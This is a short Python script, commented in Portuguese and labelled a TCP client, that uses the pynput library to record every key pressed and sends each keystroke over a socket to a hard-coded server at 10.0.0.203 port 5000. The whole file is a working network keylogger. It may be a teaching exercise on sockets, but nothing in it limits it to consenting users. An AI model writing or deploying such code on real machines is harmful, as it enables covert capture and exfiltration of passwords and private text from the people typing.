# Cliente TCP
# importa a biblioteca socket
import socket
# importa da biblioteca pynput o módulo keyboard
from pynput import keyboard

# Endereco IP do Servidor
SERVER = '10.0.0.203'
# Porta que o Servidor está escutando
PORT = 5000

TCP = socket.socket(socket.AF_INET,
                    socket.SOCK_STREAM)

DESTINO = (SERVER, PORT)
# Que faz a conexão no nosso servidor.
TCP.connect(DESTINO)


def on_press(key):
    keydata = str(key)

    try:
        print('Tecla {0} pressionada'.format(key.char))
        # Que faz o envio do dado para servidor.
        TCP.send(keydata.encode())

    except AttributeError:
        print('Tecla especial {0} pressionada'.format(key))
        if (str(key) != "Key.backspace") and (str(key) != "Key.space") and (str(key) != "Key.esc"):
            pass
        else:
            # Que faz o envio do dado para servidor
            TCP.send(keydata.encode())


with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
